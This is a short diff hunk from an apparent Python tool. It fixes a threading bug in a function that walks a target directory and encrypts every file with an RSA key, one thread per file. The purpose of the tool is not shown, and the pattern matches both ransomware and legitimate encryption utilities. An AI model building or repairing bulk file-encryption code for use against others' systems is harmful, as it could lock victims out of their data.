@@ -421,7 +421,7 @@ def encrypt_files(args):
             for root, _, files in os.walk(target):
                 for file in files:
                     file_path = os.path.join(root, file)
-                    thread = threading.Thread(encrypt_file, args=(file_path, rsa_key,))
+                    thread = threading.Thread(target=encrypt_file, args=(file_path, rsa_key,))
                     threads.append(thread)
                     print(f"Encrypting {file_path}")
 
